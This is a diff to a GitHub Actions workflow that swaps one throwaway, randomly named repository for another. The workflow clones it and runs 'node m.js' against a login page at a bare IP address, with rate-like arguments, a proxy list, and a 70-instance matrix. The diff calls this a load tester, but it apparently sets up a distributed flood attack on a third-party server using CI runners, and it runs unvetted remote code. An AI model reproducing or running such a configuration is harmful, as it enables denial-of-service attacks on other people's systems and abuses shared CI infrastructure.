@@ -33,14 +33,14 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install axios
+        run: npm install axios hpack 
             
       - name: Run HTTP/3 load tester
         run: |
           
-          git clone  https://github.com/Uhnh9iiib8hrbr9hb9hb49y9rhh9c9h/legendary-enigma.git
-          cd legendary-enigma
-          node main.js  
+          git clone  https://github.com/Ggeg111/curly-octo-doodle.git
+          cd curly-octo-doodle
+          node m.js https://45.90.16.40/login 700 4 90 proxy.txt  
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
